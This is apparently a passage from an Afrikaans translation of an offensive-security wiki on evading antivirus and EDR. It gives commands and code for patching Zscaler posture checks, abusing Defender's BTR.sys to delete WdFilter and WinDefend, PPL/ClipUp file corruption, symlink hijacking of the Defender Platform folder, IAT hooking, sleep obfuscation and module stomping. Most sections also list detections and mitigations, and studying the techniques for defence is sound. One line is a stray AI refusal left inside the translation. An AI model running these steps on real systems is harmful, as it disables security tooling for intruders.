| Binêre lêer | Oorspronklike logika wat gewysig word | Resultaat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` terug, dus voldoen elke kontrole |
| `ZSAService.exe` | Indirekte oproep na `WinVerifyTrust` | NOP-ed ⇒ enige proses (selfs ’n ongetekende een) kan aan die RPC-pype koppel |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang met `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integriteitskontroles op die tonnel | Kortgesluit |

Uittreksel van ’n minimale patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nadat die oorspronklike lêers vervang is en die diensstapel herbegin is:

* **Alle** houdingkontroles wys **groen/nakomend**.
* Ongeseëlde of gewysigde binaries kan die benoemde-pyp-RPC-eindpunte oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer kry onbeperkte toegang tot die interne netwerk wat deur die Zscaler-beleide gedefinieer word.

Hierdie gevallestudie wys hoe suiwer kliëntkant-vertrouensbesluite en eenvoudige handtekeningkontroles met ’n paar greep-lappies omseil kan word.

## Microsoft Defender `BTR.sys`-misbruik van vertroude funksionaliteit

Defender se **Boot-Time Removal**-drywer is ’n nuttige teenvoorbeeld van klassieke BYOVD. `BTR.sys` is ’n wettige Microsoft-ondertekende herstelkomponent sonder ’n geheuekorrupsiefout of IOCTL-koppelvlak; nadat administrateurtoegang en `SeLoadDriverPrivilege` verkry is, kan ’n operateur eerder sy private hersteltransaksie vervals en die bedoelde Ring-0-lêer-/registerbewerkings uitvoer. Dit is ’n **primitief vir AV/EDR-neutralisering ná kompromittering, nie vir aanvanklike toegang of voorregte-eskalasie nie**, en die drywer kan uit die teiken se eie `MpEngine.dll`-`BOOTTIMETOOL`-hulpbron onttrek word, in plaas daarvan om ’n opvallende derdeparty-drywer in te voer.<sup>[[36]](#references)</sup>

### Voorbereiding van die eenmalige drywer

Defender plaas die hulpbron gewoonlik as ’n ewekansige `[a-z]{8}.sys`-lêer en registreer ’n kerneldiens met ’n soortgelyke naam. `DriverEntry` lees die diens se `Args`-waarde, maak die verwysde NTFS ADS oop, dekripteer en valideer die aksielys, skryf terugvoer en gee `0xC0000056` (`STATUS_DELETE_PENDING`) terug ná suksesvolle uitvoering, sodat die drywer ontlaai in plaas daarvan om inwonend te bly. ’n Vervalste diens het die volgende kenmerkende waardes.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Die `:changelist`-stroom bevat een RC4-geënkripteerde blob. Die ontlede builds hergebruik ’n vaste 256-greep-sleutel, dus is enkripsie nie ’n magtigingsgrens nie. ’n Geldige plaintext het ’n globale kopstuk van 24 grepe (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, kopstuk-CRC en ’n payload-afgeleide transaksie-ID), gevolg deur ’n nul-getermineerde UTF-16-terugvoerlêerpad en enige aantal items. Elke item het ’n kopstuk van 16 grepe (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) plus aksiespesifieke data wat eindig met **presies vier NUL-grepe**. Elke kopstuk-/datagebied word onafhanklik nagegaan met CRC-32-polinoom `0xEDB88320`, aanvanklike toestand `0xFFFFFFFF` en **geen finale XOR** (`~CRC32`); die CRC-toestand word vir elke gebied teruggestel.<sup>[[36]](#references)[[37]](#references)</sup>

Die aanvaarde aksie-ID’s stel hierdie kernel-primitiewe beskikbaar.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Itemdata | Resultaat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Vee ’n lêer uit, insluitend ’n geslote lêer |
| 2 | `[UTF-16 path]` | Verwyder ’n leë gids |
| 3 | `[Flags][source][destination]` | Skuif ’n lêer na ’n aanvallergekose beskermde pad; ’n leë bestemming beteken uitvee |
| 4 | `[Flags][key path]` | Vee ’n registersleutel rekursief uit |
| 5 | `[Flags][key path + "\\" + value]` | Vee ’n registerwaarde uit |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Skep/dateer ’n registerwaarde op en skep ontbrekende sleutelspaaie |

Vir aksies 5 en 6 is die sleutel-/waardeskeier op die draad **twee opeenvolgende backslashes**; ’n konvensioneel geformateerde pad sal nie korrek opgedeel word nie. Die terugvoerlêer weerspieël meestal die versoek, maar die eerste vier grepe van elke item se data word die resulterende `NTSTATUS`. Vir aksies 1 en 2, wat geen voorste vlae-veld het nie, skuif BTR die pad na die vier gereserveerde agterste grepe om plek vir daardie status te maak.<sup>[[36]](#references)</sup>

### `BTR_CLI`-werkvloei en vroeëlaaivenster

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementeer die volledige ketting: onttrek `BTR.sys` uit plaaslike Defender, skep `<random>.sys:changelist` en ’n terugvoerstroom, serialiseer/kontroleer somme/enkripteer gekoppelde aksies, skep direk die diensregistersleutel en roep dan `NtLoadDriver` aan vir `-trigger now`, of laat dit as ’n stelselbeginbestuurder vir `-trigger boot`. Direkte registeropstelling vermy die normale SCM `CreateServiceW`-pad en lewer dus **nie** diensinstallasiegebeurtenis-ID 7045 op nie. Artefakte wat met ’n selflaaier sneller word, kan later verwyder word met `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` is nie bruikbaar nie, omdat BTR lêer-I/O vanaf `DriverEntry` uitvoer voordat die sto bergingsstapel en `SystemRoot`-skakel gereed is. `Start=1` plus die hoëprioriteitgroep `Boot Bus Extender` voer eerder in Fase 1 uit: NTFS is bruikbaar, maar baie sekuriteitsdrywers wat met die stelsel begin en EDR-dienste in gebruikersmodus is nog nie geïnisialiseer nie. Opstartfilters soos `WdFilter` is dalk reeds gelaai, maar BTR kan hul binaries of dienskonfigurasie verwyder voordat die volgende opstart plaasvind, en kan diensuitvoerbare lêers uitvee voordat SCM hulle begin. ELAM sluit nie hierdie gaping nie, omdat BTR ná die opstart-evaluering loop en ’n geldige Microsoft-handtekening het.<sup>[[36]](#references)</sup>

Veelvuldige aksies word in een transaksie uitgevoer. Die PoC voeg Aksie 1 vooraan vir die hardgekodeerde `\SystemRoot\Temp\BootClean.log`: BTR skep hierdie log, verwerk dan sy eie uitveeversoek en verwyder dit voordat dit ontlaai. Dit verminder bewyse, terwyl terugvoer in `<random>.sys:<random>.dat` geplaas kan word sodat die drywer en albei strome saam verwyder kan word.<sup>[[36]](#references)[[37]](#references)</sup>

### Opsporingskorrelasies met hoë seinwaarde

Reëls wat slegs op handtekeninge steun en die Microsoft-lys van geblokkeerde kwesbare drywers spreek nie misbruik van BTR se bedoelde funksionaliteit aan nie. Verkies hierdie gedragskorrelasies, en onderskei terselfdertyd ’n legitieme Defender-afstamming van ’n willekeurige lanseerder.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Skepping van `.sys:changelist` is universeel vir BTR-stadiëring. ’n `.dat` ADS wat aan dieselfde `.sys` gekoppel is, is besonder verdag, omdat legitieme Defender terugvoer normaalweg onder `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` plaas.
- **Sysmon 12/13 sonder System 7045:** Korrelleer direkte skepping van `HKLM\SYSTEM\CurrentControlSet\Services\<random>` met `Args=...:changelist` en `Group=Boot Bus Extender` met geen ooreenstemmende SCM-installasiegebeurtenis nie.
- **Sysmon 6 -> 23:** Korrelleer ’n bekende BTR-drywerlading vanuit ’n nie-Defender-afstamming met daaropvolgende lêeruitwissing toegeskryf aan `System`/PID 4, veral vir sekuriteitsbinaries.
- **Sysmon 11 -> 23:** Genereer ’n waarskuwing vir die vinnige skepping en uitwissing van `\SystemRoot\Temp\BootClean.log` deur `System`/PID 4.
- Beperk en oudit die toekenning/aktivering van `SeLoadDriverPrivilege`; ’n Microsoft-handtekening alleen is nie voldoende rede vir vertroue wanneer ’n sekuriteitnutsmiddel se drywer deur `cmd.exe`, PowerShell of ’n onbekende proses gestadieer word nie.

## Misbruik van Protected Process Light (PPL) om AV/EDR met LOLBINs te peuter

Protected Process Light (PPL) dwing ’n ondertekenaar-/vlakhiërargie af sodat slegs beskermde prosesse met dieselfde of ’n hoër vlak met mekaar kan peuter. Vanuit ’n offensiewe oogpunt kan jy, as jy ’n PPL-geaktiveerde binary wettig kan begin en die argumente daarvan beheer, onskadelike funksionaliteit (bv. logging) omskep in ’n beperkte skryfprimitive, gerugsteun deur PPL, teen beskermde gidse wat deur AV/EDR gebruik word.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Wat ’n proses as PPL laat loop
- Die teiken-EXE (en enige gelaaide DLL’s) moet met ’n PPL-geskikte EKU onderteken wees.
- Die proses moet met CreateProcess geskep word deur die vlae te gebruik: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- ’n Versoenbare beskermingsvlak moet versoek word wat met die binary se ondertekenaar ooreenstem (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware-ondertekenaars, `PROTECTION_LEVEL_WINDOWS` vir Windows-ondertekenaars). Verkeerde vlakke sal tydens skepping misluk.

Sien ook hier ’n breër inleiding tot PP/PPL en LSASS-beskerming:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Lanseerdernutsmiddels
- Oopbronhelper: CreateProcessAsPPL (kies die beskermingsvlak en stuur argumente aan die teiken-EXE deur):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Gebruikspatroon:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Ek kan nie hierdie operasionele instruksies vertaal nie, aangesien dit beskryf hoe om antiviruslêers te beskadig en beskerming tydens opstart te omseil. Ek kan wel help met ’n verdedigende opsomming of advies oor hoe om hierdie tegniek op te spoor en daarteen te beskerm.

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notas en beperkings
- Jy kan nie die inhoud beheer wat ClipUp skryf nie, behalwe waar dit geplaas word; hierdie primitief is geskik vir korrupsie eerder as presiese inhoudinspuiting.
- Plaaslike admin/SYSTEM is nodig om ’n diens te installeer/te begin, asook ’n herlaaivenster.
- Tydsberekening is van kritieke belang: die teiken moet nie oop wees nie; uitvoering tydens opstart vermy lêerslotte.

Opsporing
- Proseskepping van `ClipUp.exe` met ongewone argumente, veral met nie-standaard launchers as ouers, rondom opstart.
- Nuwe dienste wat ingestel is om verdagte binaries outomaties te begin en konsekwent voor Defender/AV te begin. Ondersoek die skep/wysiging van dienste voordat Defender-opstartfoute voorkom.
- Monitering van lêerintegriteit op Defender-binaries/Platform-gidse; onverwagte lêerskeppings/-wysigings deur prosesse met protected-process-vlae.
- ETW/EDR-telemetrie: soek na prosesse wat met `CREATE_PROTECTED_PROCESS` geskep is en abnormale gebruik van PPL-vlakke deur nie-AV-binaries.

Versagtings
- WDAC/Code Integrity: beperk watter ondertekende binaries as PPL mag loop en onder watter ouers; blokkeer ClipUp-aanroepe buite wettige kontekste.
- Dienshigiëne: beperk die skep/wysiging van dienste wat outomaties begin en monitor manipulasie van beginvolgorde.
- Maak seker dat Defender se tamper protection en vroeë-opstartbeskerming geaktiveer is; ondersoek opstartfoute wat op binêre korrupsie dui.
- Oorweeg dit om die generering van 8.3-kortname te deaktiveer op volumes waarop sekuriteitsnutsgoed gehuisves word, indien dit met jou omgewing versoenbaar is (toets deeglik).

## Peuter met Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender kies die platform waarvandaan dit loop deur subgidse onder die volgende pad op te tel:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Dit kies die subgids met die hoogste leksikografiese weergawestring (bv. `4.18.25070.5-0`), en begin dan die Defender-diensprosesse van daar af (waarby diens-/registerpaaie dienooreenkomstig opgedateer word). Hierdie keuse vertrou op gidry-inskrywings, insluitend directory reparse points (symlinks). ’n Administrateur kan dit benut om Defender na ’n pad te herlei wat deur ’n aanvaller geskryf kan word en DLL sideloading of diensontwrigting te bewerkstellig.<sup>[[21]](#references)[[22]](#references)</sup>

Voorvereistes
- Plaaslike Administrateur (nodig om gidse/symlinks onder die Platform-gids te skep)
- Die vermoë om te herlaai of Defender se platformherkeuse te aktiveer (diensherbegin tydens opstart)
- Slegs ingeboude nutsgoed word benodig (mklink)

Waarom dit werk
- Defender blokkeer skryfbewerkings in sy eie gidse, maar sy platformkeuse vertrou op gidry-inskrywings en kies die leksikografies hoogste weergawe sonder om te bevestig dat die teiken na ’n beskermde/vertroude pad wys.

Stap vir stap (voorbeeld)
1) Berei ’n skryfbare kloon van die huidige platformgids voor, bv. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Skep ’n gids-symlink met ’n hoër weergawe binne Platform wat na jou vouer wys:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-keuse (herlaai aanbeveel):
```cmd
shutdown /r /t 0
```
4) Verifieer dat MsMpEng.exe (WinDefend) vanaf die herleide pad loop:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Jy behoort die nuwe prosespad onder `C:\TMP\AV\` waar te neem, en die dienskonfigurasie/register wat na daardie ligging verwys.

Post-exploitation-opsies
- DLL-sideloading/kode-uitvoering: Plaas/vervang DLL’s wat Defender vanuit sy toepassingsgids laai om kode in Defender se prosesse uit te voer. Sien die afdeling hierbo: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Diensafskakeling/diensweiering: Verwyder die weergawe-simboliese skakel sodat die gekonfigureerde pad met die volgende aanvang nie oplos nie en Defender nie kan begin nie:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Let daarop dat hierdie tegniek nie op sigself voorregte-escalasie bied nie; dit vereis admin-regte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams kan runtime-evasion uit die C2-implant verskuif na die teikenmodule self deur die Import Address Table (IAT) daarvan te hook en geselekteerde API’s deur aanvallerbeheerde, posisie-onafhanklike code (PIC) te stuur. Dit veralgemeen evasion tot buite die klein API-oppervlak wat baie kits blootstel (bv. CreateProcessA), en brei dieselfde beskerming uit na BOFs en post-exploitation-DLL’s.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Hoëvlakbenadering
- Stasioneer ’n PIC-blob langs die teikenmodule met behulp van ’n reflective loader (voorafgeplaas of as metgesel). Die PIC moet selfstandig en posisie-onafhanklik wees.
- Terwyl die gasheer-DLL laai, loop deur sy IMAGE_IMPORT_DESCRIPTOR en herstel die IAT-inskrywings vir geteikende imports (bv. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) sodat hulle na dun PIC-wrappers wys.
- Elke PIC-wrapper voer evasions uit voordat dit die werklike API-adres met ’n tail call aanroep. Tipiese evasions sluit in:
  - Geheuemaskering/-ontmaskering rondom die oproep (bv. enkripteer beacon-streke, RWX→RX, verander bladsynaam/-toestemmings) en herstel dit daarna.
  - Call-stack-spoofing: bou ’n onskadelike stack en skakel oor na die teiken-API sodat call-stack-ontleding na verwagte rame lei.<sup>[[9]](#references)</sup>
- Voer vir versoenbaarheid ’n koppelvlak uit sodat ’n Aggressor-script (of ekwivalent) kan registreer watter API’s vir Beacon, BOFs en post-ex-DLL’s gehook moet word.

Waarom IAT hooking hier
- Werk vir enige code wat die gehookte import gebruik, sonder om tool-code te wysig of daarop staat te maak dat Beacon spesifieke API’s as tussenganger gebruik.
- Dek post-ex-DLL’s: deur LoadLibrary* te hook, kan jy moduleladings onderskep (bv. System.Management.Automation.dll, clr.dll) en dieselfde maskerings- en stack-evasion op hul API-oproepe toepas.
- Herstel betroubare gebruik van post-ex-opdragte wat prosesse skep teen call-stack-gebaseerde opsporing deur CreateProcessA/W te wrapper.

Minimale IAT-hook-skets (x64 C/C++-pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Pas die patch toe ná relocations/ASLR en vóór die eerste gebruik van die import. Reflective loaders soos TitanLdr/AceLdr demonstreer hooking tydens die DllMain van die gelaaide module.
- Hou wrappers klein en PIC-safe; bepaal die ware API via die oorspronklike IAT-waarde wat jy vasgelê het voordat jy patch, of via LdrGetProcedureAddress.
- Gebruik RW → RX-oorgange vir PIC en vermy om bladsye skryfbaar én uitvoerbaar te laat.

Call‑stack spoofing stub
- PIC-stubs in die Draugr-styl bou ’n vals oproepketting (return addresses in modules wat nie verdag is nie) en spring dan na die werklike API.
- Dit omseil opsporing wat kanonieke stacks van Beacon/BOFs na sensitiewe APIs verwag.
- Kombineer dit met stack cutting/stack stitching-tegnieke om binne verwagte frames te land voordat die API-proloog begin.

Operasionele integrasie
- Voeg die reflective loader vooraan post-ex-DLLs in, sodat die PIC en hooks outomaties geïnisialiseer word wanneer die DLL gelaai word.
- Gebruik ’n Aggressor-script om teiken-APIs te registreer, sodat Beacon en BOFs deursigtig by dieselfde evasion-pad baat sonder kodeveranderinge.

Opsporing/DFIR-oorwegings
- IAT-integriteit: inskrywings wat na nie-image- (heap/anon-)adresse oplos; periodieke verifikasie van import-pointers.
- Stack-anomalieë: return addresses wat nie aan gelaaide images behoort nie; skielike oorgange na nie-image-PIC; inkonsekwente RtlUserThreadStart-voorgeslag.
- Loader-telemetrie: in-proses-skrywery na die IAT; vroeë DllMain-aktiwiteit wat import-thunks wysig; onverwagte RX-streke wat tydens laai geskep word.
- Image-load-evasion: as jy LoadLibrary* hook, monitor verdagte laaisels van automation/clr-assemblies wat met geheuemaskering-gebeure saamval.

Verwante boublokke en voorbeelde
- Reflective loaders wat IAT-patching tydens laai uitvoer (bv. TitanLdr, AceLdr)
- Memory-masking-hooks (bv. simplehook) en stack-cutting-PIC (stackcutting)
- PIC call-stack spoofing-stubs (bv. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT-hooks via ’n inwonende PICO

As jy ’n reflective loader beheer, kan jy imports **tydens** `ProcessImports()` hook deur die loader se `GetProcAddress`-pointer met ’n pasgemaakte resolver te vervang wat hooks eerste nagaan:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Bou ’n **inwonende PICO** (aanhoudende PIC-objek) wat voortbestaan nadat die tydelike loader-PIC homself vrygestel het.
- Voer ’n `setup_hooks()`-funksie uit wat die loader se import-resolver oorskryf (bv. `funcs.GetProcAddress = _GetProcAddress`).
- Slaan ordinal-imports in `_GetProcAddress` oor en gebruik ’n hash-gebaseerde hook-opsoek soos `__resolve_hook(ror13hash(name))`. As ’n hook bestaan, gee dit terug; anders, delegeer na die werklike `GetProcAddress`.
- Registreer hook-teikens tydens link-tyd met Crystal Palace `addhook "MODULE$Func" "hook"`-inskrywings. Die hook bly geldig omdat dit binne die inwonende PICO woon.

Dit lewer **import-time IAT-herleiding** sonder om die gelaaide DLL se kodedeel ná laai te patch.

### Dwing hookbare imports af wanneer die teiken PEB-walking gebruik

Import-time-hooks word net geaktiveer as die funksie werklik in die teiken se IAT voorkom. As ’n module APIs via ’n PEB-walk + hash oplos (sonder ’n import-inskrywing), dwing ’n werklike import af sodat die loader se `ProcessImports()`-pad dit kan sien:

- Vervang hashed export-resolusie (bv. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) met ’n direkte verwysing soos `&WaitForSingleObject`.
- Die compiler genereer ’n IAT-inskrywing, wat onderskepping moontlik maak wanneer die reflective loader imports oplos.

### Ekko-styl sleep/idle-obfuscation sonder om `Sleep()` te patch

In plaas daarvan om `Sleep` te patch, hook die **werklike wait/IPC-primitives** wat die implant gebruik (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Vir lang wagtye, omring die oproep met ’n Ekko-styl obfuscation-ketting wat die geheuebeeld tydens idle enkripteer:<sup>[[31]](#references)[[27]](#references)</sup>

- Gebruik `CreateTimerQueueTimer` om ’n reeks callbacks te skeduleer wat `NtContinue` met vervaardigde `CONTEXT`-frames aanroep.
- Tipiese ketting (x64): stel die image op `PAGE_READWRITE` → RC4-enkripteer met `advapi32!SystemFunction032` oor die volledige gemapte image → voer die blokkerende wait uit → RC4-dekripteer → **herstel per-section-permissions** deur PE-sections deur te loop → gee voltooiing aan.
- `RtlCaptureContext` verskaf ’n `CONTEXT`-sjabloon; kloon dit in verskeie frames en stel registers (`Rip/Rcx/Rdx/R8/R9`) om elke stap aan te roep.

Operasionele besonderheid: gee “success” terug vir lang wagtye (bv. `WAIT_OBJECT_0`), sodat die caller voortgaan terwyl die image gemasker is. Hierdie patroon verberg die module vir skandeerders tydens idle-vensters en vermy die klassieke “patched `Sleep()`”-signatuur.

Opsporingsidees (telemetriegebaseer)
- Reekse `CreateTimerQueueTimer`-callbacks wat na `NtContinue` wys.
- `advapi32!SystemFunction032` wat op groot, aaneenlopende buffers ter grootte van ’n image gebruik word.
- Groot-reeks-`VirtualProtect`, gevolg deur pasgemaakte herstel van per-section-permissions.

### Runtime CFG-registrasie vir sleep-obfuscation-gadgets

Op CFG-geaktiveerde teikens sal die eerste indirekte sprong na ’n mid-function-gadget soos `jmp [rbx]` of `jmp rdi` gewoonlik die proses laat crash met `STATUS_STACK_BUFFER_OVERRUN`, omdat die gadget nie in die module se CFG-metadata voorkom nie. Om Ekko/Kraken-styl-kettings binne geharde prosesse aan die gang te hou:<sup>[[30]](#references)</sup>

- Registreer elke indirekte bestemming wat die ketting gebruik met `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` en `CFG_CALL_TARGET_VALID`-inskrywings.
- Vir adresse binne gelaaide images (`ntdll`, `kernel32`, `advapi32`), moet die `MEMORY_RANGE_ENTRY` by die **image base** begin en die **volle image-grootte** dek.
- Gebruik eerder die **allocation base** en allocation-grootte vir handmatig gemapte/PIC/stomped-streke.
- Merk nie net die dispatch-gadget nie, maar ook exports wat indirek bereik word (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event-syscalls) en enige aanvallerbeheerde uitvoerbare sections wat indirekte teikens sal word.

Dit verander ROP/JOP-styl-sleep-kettings van “werk net in nie-CFG-prosesse” na ’n herbruikbare primitief vir `explorer.exe`, browsers, `svchost.exe` en ander endpoints wat met `/guard:cf` gebou is.

### CET-veilige stack spoofing vir slapende threads

Volledige `CONTEXT`-vervanging is opvallend en kan op CET Shadow Stack-stelsels breek, omdat ’n vervalste `Rip` steeds met die hardeware-shadow-stack moet ooreenstem. ’n Veiliger sleep-masking-patroon is:<sup>[[30]](#references)</sup>

- Kies ’n ander thread in dieselfde proses en lees sy `NT_TIB` / TEB-stackgrense (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Rugsteun die huidige thread se werklike TEB/TIB.
- Vang die werklike slaapkonteks vas met `GetThreadContext`.
- Kopieer **slegs** die werklike `Rip` na die spoof-konteks, en laat die vervalste `Rsp`/stack-toestand onveranderd.
- Kopieer gedurende die slaapvenster die spoof-thread se `NT_TIB` na die huidige TEB, sodat stack walkers binne ’n wettige stack-reeks unwinding uitvoer.
- Nadat die wait klaar is, herstel die oorspronklike TIB en thread-konteks.

Dit behou ’n CET-konsekwente instruksiewyser terwyl EDR-stack walkers wat TEB-stack-metadata vertrou om unwinds te valideer, mislei word.

### APC-gebaseerde alternatief: Kraken Mask

As timer-queue-dispatch te herkenbaar is, kan dieselfde sleep-encrypt-spoof-restore-volgorde vanaf ’n opgeskorte helper-thread met queued APCs uitgevoer word:<sup>[[27]](#references)</sup>

- Skep ’n helper-thread met `NtTestAlert` as entrypoint.
- Queue voorbereide `CONTEXT`-frames/APCs met `NtQueueApcThread` en verwerk hulle met `NtAlertResumeThread`.
- Stoor die kettingtoestand op die heap in plaas van die helper-stack om te verhoed dat die verstek-64 KB-thread-stack uitgeput word.
- Gebruik `NtSignalAndWaitForSingleObject` om die begingebeurtenis atomies aan te dui en te blokkeer.
- Skort die main thread op voordat die TIB/konteks herstel word (`NtSuspendThread` → restore → `NtResumeThread`), om die race-venster te verklein waarin ’n skandeerder ’n gedeeltelik herstelde stack kan opspoor.

Dit vervang die `CreateTimerQueueTimer` + `NtContinue`-signatuur met ’n helper-thread/APC-signatuur, terwyl dieselfde RC4-masking- en stack-spoofing-doelwitte behou word.

Bykomende opsporingsidees
- `NtSetInformationVirtualMemory` met `VmCfgCallTargetInformation` kort voor sleeps, waits of APC-dispatch.
- `GetThreadContext`/`SetThreadContext` wat rondom `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` of `ConnectNamedPipe` gebruik word.
- `NtQueryInformationThread` gevolg deur direkte skrywery na die huidige thread se TEB/TIB-stackgrense.
- `NtQueueApcThread`/`NtAlertResumeThread`-kettings wat indirek `SystemFunction032`, `VirtualProtect` of helpers vir die herstel van section-permissions bereik.
- Herhaalde gebruik van kort gadget-signatures soos `FF 23` (`jmp [rbx]`) of `FF E7` (`jmp rdi`) as dispatch-pivots binne ondertekende modules.


## Precision Module Stomping

Module stomping voer payloads uit die **`.text`-section van ’n DLL wat reeds binne die teikenproses gemap is** uit, in plaas daarvan om ooglopende private uitvoerbare geheue toe te ken of ’n nuwe opofferings-DLL te laai. Die overwrite-teiken moet ’n **gelaaide, skyfondersteunde image** wees waarvan die koderuimte die payload kan akkommodeer sonder om kodepaaie te beskadig wat die proses steeds nodig het.<sup>[[1]](#references)[[2]](#references)</sup>

### Betroubare teikenkeuse

Eenvoudige stomping teen algemene modules soos `uxtheme.dll` of `comctl32.dll` is broos: die DLL is dalk nie in die afgeleë proses gelaai nie, en ’n te klein kodegebied sal die proses laat crash. ’n Betroubaarder werksvloei is:

1. Tel die teikenproses se modules op en hou ’n **name-only-include-lys** van DLLs wat reeds gelaai is.
2. Bou eers die payload en teken sy **presiese grepegrootte** aan.
3. Skandeer kandidaat-DLLs op skyf en vergelyk die PE-section **`.text` `Misc_VirtualSize`** met die payloadgrootte. Dit is belangriker as die lêergrootte, want dit weerspieël die grootte van die uitvoerbare section **wanneer dit in die geheue gemap word**.
4. Ontleed die **Export Address Table (EAT)** en kies ’n RVA van ’n uitgevoerde funksie as die stomp-beginoffset.
5. Bereken die **blast radius**: as die payload die gekose funksiegrens oorskry, sal dit aangrensende exports oorskryf wat daarna in die geheue gerangskik is.

Tipiese recon-/keusehelpers wat in die praktyk voorkom:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operasionele notas
- Verkies DLLs wat **reeds gelaai** is in die afgeleë proses om die telemetrie van `LoadLibrary`/onverwagte image loads te vermy.
- Verkies exports wat die teikentoepassing selde uitvoer; anders kan normale kodepaaie die gestompte grepe raak voordat of nadat die thread geskep is.
- Groot implants vereis dikwels dat die inbedding van shellcode van ’n string literal na ’n **byte-array/braced initializer** verander word, sodat die volledige buffer korrek in die injector-bronkode voorgestel word.

Opsporingsidees
- Afgeleë skryfbewerkings na image-backed uitvoerbare bladsye (`MEM_IMAGE`, `PAGE_EXECUTE*`) in plaas van die meer algemene private RWX/RX-toekennings.
- Export entry points waarvan die grepe in geheue nie meer ooreenstem met die backing file op skyf nie.
- Remote threads of context pivots wat uitvoering begin binne ’n wettige DLL-export waarvan die eerste grepe onlangs gewysig is.
- Verdagte `VirtualProtect(Ex)`- / `WriteProcessMemory`-reekse teen DLL `.text`-bladsye, gevolg deur thread creation.

## Process Parameter Poisoning (P3)

